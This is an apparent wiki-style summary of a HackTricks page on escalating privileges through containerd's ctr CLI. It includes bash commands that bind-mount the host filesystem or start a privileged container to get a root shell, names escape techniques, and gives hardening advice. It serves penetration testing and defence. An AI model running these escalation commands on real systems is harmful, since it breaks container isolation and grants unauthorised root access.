---
title: "HackTricks: containerd (ctr) Privilege Escalation"
tags: [linux-hardening, privilege-escalation, container-security, containerd]
sources: [hacktricks-containerd-ctr-privilege-escalation.md]
updated: 2026-05-01
---

# HackTricks: containerd (ctr) Privilege Escalation

Source: [hacktricks-containerd-ctr-privilege-escalation.md](../../raw/hacktricks-containerd-ctr-privilege-escalation.md)

## Key Takeaways

If `ctr` (containerd's low-level CLI) is accessible to an unprivileged user, it bypasses Docker's authorization layer entirely. Two immediate escalation paths exist: mount the host root FS into a new container, or run a privileged container and exploit capabilities to escape. The `ctr` binary has no daemon-side authorization equivalent to Docker's authz plugin system.

## PE 1 — Host Root Bind Mount

```bash
# List available images
ctr image list

# Mount host / into a new container and get a shell as root
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
# Now inside container: host filesystem is at /
```

Any local or registry image works — the bind mount gives direct read/write access to the host filesystem.

## PE 2 — Privileged Container Escape

```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
# Then use standard privileged container escape techniques (cgroup release_agent,
# /proc/sysrq-trigger, host namespace access, etc.)
```

## Why This Matters

Unlike `docker run`, `ctr` does not consult Docker's daemon or any admission controller. In Kubernetes clusters, `containerd` is the CRI; if `ctr` is installed and accessible, it represents a complete cluster escape vector — bypassing all K8s RBAC, PSP/PSA, and OPA/Gatekeeper policies.

## Detection / Hardening

- Restrict `ctr` binary access (`chmod 700`, owned by root)
- Monitor for `ctr run` invocations outside expected service accounts
- Prefer higher-level runtimes (Docker, Podman) that enforce authorization layers

## Related

- [container-security](../concepts/container-security.md)
- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: runc Privilege Escalation](hacktricks-runc-privilege-escalation.md)
- [HackTricks](../entities/hacktricks.md)
